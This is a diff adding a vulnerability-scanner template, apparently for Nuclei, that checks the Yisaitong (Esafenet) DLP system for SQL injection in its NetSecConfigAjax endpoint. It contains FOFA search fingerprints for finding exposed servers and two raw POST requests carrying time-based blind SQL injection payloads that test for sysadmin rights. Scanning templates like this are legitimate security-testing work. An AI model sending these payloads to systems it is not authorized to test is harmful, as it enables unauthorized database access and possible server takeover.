@@ -1,0 +1,45 @@
+id: yisaitong-DLP-NetSecConfigAjax-sql
+
+info:
+  name: "亿赛通数据泄露防护 (DLP) 系统NetSecConfigAjax接口SQL注入漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    f
+      fofa: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp" || body="/CDGServer3/index.jsp"
+      亿赛通数据泄露防护(DLP)系统NetSecConfigAjax接口存在SQL注入漏洞。攻击者可通过构造恶意SQL语句，绕过输入验证机制，执行未经授权的数据库操作。在具备高权限条件下，可能实现服务器文件写入，进而控制服务器系统资源。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/141019294
+  tags: 亿赛通
+
+
+http:
+- raw:
+  - |
+    POST /CDGServer3/NetSecConfigAjax;Service HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:4'--
+
+
+  - |
+    POST /CDGServer3/NetSecConfigAjax;Service HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:8'--
+
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
+
+
+
